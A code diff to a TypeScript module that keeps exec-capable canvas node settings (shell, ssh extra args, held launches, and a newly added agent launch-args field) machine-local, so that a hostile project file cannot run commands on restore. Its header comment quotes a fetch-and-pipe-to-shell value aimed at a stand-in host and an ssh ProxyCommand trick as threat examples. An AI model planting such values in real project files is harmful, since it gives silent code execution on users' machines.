@@ -12,6 +12,11 @@
  *    `"shell": "curl evil.sh|sh"`, or simply point at a script committed in the repo.
  *  - `NodeState.ssh.extraArgs` — spliced verbatim into the `ssh` argv (`buildSshArgs`), where
  *    `-o ProxyCommand=<cmd>` makes ssh run `<cmd>` LOCALLY through /bin/sh.
+ *  - `CanvasNodeState.agentLaunchArgs` — per-session extra CLI arguments (`open-agent
+ *    --launch-args`), re-applied to the agent's launch line on every relaunch of the node. A flag
+ *    like `--mcp-config <file>` or `--settings <file>` makes the CLI start processes / install hooks,
+ *    so a project file carrying one would be code execution on the next restore. Machine-local like
+ *    `shell`: produced only by this machine's own canvas control.
  *  - `CanvasNodeState.pendingLaunch` — a held launch. Its `command` is TYPED into the node's shell
  *    once the canvas says the wait is over (`launchesToFire`), and `after: []` or a dep that no
  *    longer exists counts as satisfied. So a project file or a wire frame carrying one is a command
@@ -35,6 +40,7 @@
 
 import { normalizeHeldLaunchIntent, normalizePendingLaunch } from './pending-launch-shape'
 import { sshExtraArgsEnableLocalExec } from './ssh'
+import { normalizeLaunchArgs } from './agents/launch-args'
 import type { CanvasMutation, CanvasNodeState, HeldLaunchIntent, PendingLaunch } from './types'
 
 /** Per-node exec values the LOCAL machine typed. Persisted only in the machine-local index. */
@@ -43,6 +49,8 @@ export interface LocalNodeExec {
   shell?: string
   /** `NodeState.ssh.extraArgs` — raw advanced ssh args for this node's connection. */
   sshExtraArgs?: string
+  /** `CanvasNodeState.agentLaunchArgs` — the per-session `--launch-args` this agent node relaunches with. */
+  agentLaunchArgs?: string
   /** `CanvasNodeState.pendingLaunch` — a launch THIS machine armed and has not delivered yet. */
   pendingLaunch?: PendingLaunch
   /** `CanvasNodeState.launchIntent` — the semantic twin of that pending launch, never without it. */
@@ -86,6 +94,7 @@ function stripNodeExec(n: CanvasNodeState, keepLaunch = false): CanvasNodeState 
   const intent = n.launchIntent !== undefined && (!keepLaunch || n.pendingLaunch === undefined)
   if (
     n.shell === undefined &&
+    n.agentLaunchArgs === undefined &&
     n.ssh?.extraArgs === undefined &&
     n.ssh?.execTrusted === undefined &&
     !launch &&
@@ -94,6 +103,7 @@ function stripNodeExec(n: CanvasNodeState, keepLaunch = false): CanvasNodeState 
     return n
   const out: CanvasNodeState = { ...n }
   delete out.shell
+  delete out.agentLaunchArgs
   if (launch) delete out.pendingLaunch
   if (intent) delete out.launchIntent
   if (out.ssh) {
@@ -179,9 +189,16 @@ export function carryLocalNodeExec(
   // A trusted (owner/core) mutation is authoritative for the held launch, INCLUDING its absence:
   // that is how a delivered launch is cleared on every owner client.
   const launch = trustLaunch ? undefined : prev.pendingLaunch
-  if (prev.shell === undefined && extraArgs === undefined && launch === undefined) return next
+  if (
+    prev.shell === undefined &&
+    prev.agentLaunchArgs === undefined &&
+    extraArgs === undefined &&
+    launch === undefined
+  )
+    return next
   const out: CanvasNodeState = { ...next }
   if (prev.shell !== undefined) out.shell = prev.shell
+  if (prev.agentLaunchArgs !== undefined) out.agentLaunchArgs = prev.agentLaunchArgs
   if (launch !== undefined) {
     out.pendingLaunch = launch
     if (prev.launchIntent !== undefined) out.launchIntent = prev.launchIntent
@@ -221,6 +238,9 @@ export function localNodeExec(nodes: CanvasNodeState[]): LocalNodeExecMap | unde
   for (const n of nodes) {
     const entry: LocalNodeExec = {}
     if (n.shell && safeSessionProgram(n.shell)) entry.shell = n.shell
+    // Same re-check as `shell`: only a value the launch site would honour is blessed.
+    const launchArgs = normalizeLaunchArgs(n.agentLaunchArgs)
+    if (launchArgs) entry.agentLaunchArgs = launchArgs
     const extraArgs = n.ssh?.extraArgs
     if (extraArgs && (n.ssh?.execTrusted || !sshExtraArgsEnableLocalExec(extraArgs)))
       entry.sshExtraArgs = extraArgs
@@ -230,7 +250,7 @@ export function localNodeExec(nodes: CanvasNodeState[]): LocalNodeExecMap | unde
     if (pending) entry.pendingLaunch = pending
     const intent = normalizeHeldLaunchIntent(n.launchIntent, pending)
     if (intent) entry.launchIntent = intent
-    if (entry.shell || entry.sshExtraArgs || entry.pendingLaunch) map[n.id] = entry
+    if (entry.shell || entry.sshExtraArgs || entry.pendingLaunch || entry.agentLaunchArgs) map[n.id] = entry
   }
   return Object.keys(map).length ? map : undefined
 }
@@ -253,6 +273,9 @@ export function localNodeExec(nodes: CanvasNodeState[]): LocalNodeExecMap | unde
  *
  * `shell` is still validated: it has no producer, so anything there is either junk or an attack,
  * and blessing a value the exec site would refuse anyway buys nothing.
+ *
+ * `agentLaunchArgs` is never hoisted either: it joined the boundary the day it was introduced, so a
+ * project file has never legitimately carried one.
  *
  * `pendingLaunch` is deliberately NEVER hoisted. Its provenance cannot be told apart: a file written
  * by an older build of THIS machine and one a hostile repo committed look identical, and the
@@ -289,6 +312,8 @@ export function applyLocalNodeExec(
     // the writes below must never reach back into the caller's (parsed file's) node.
     const out: CanvasNodeState = { ...stripNodeExec(n) }
     if (mine?.shell) out.shell = mine.shell
+    const launchArgs = normalizeLaunchArgs(mine?.agentLaunchArgs)
+    if (launchArgs) out.agentLaunchArgs = launchArgs
     // workspace.json is hand-editable too: re-validate the shape, as the renderer's serializers do.
     const pending = normalizePendingLaunch(mine?.pendingLaunch)
     if (pending) out.pendingLaunch = pending
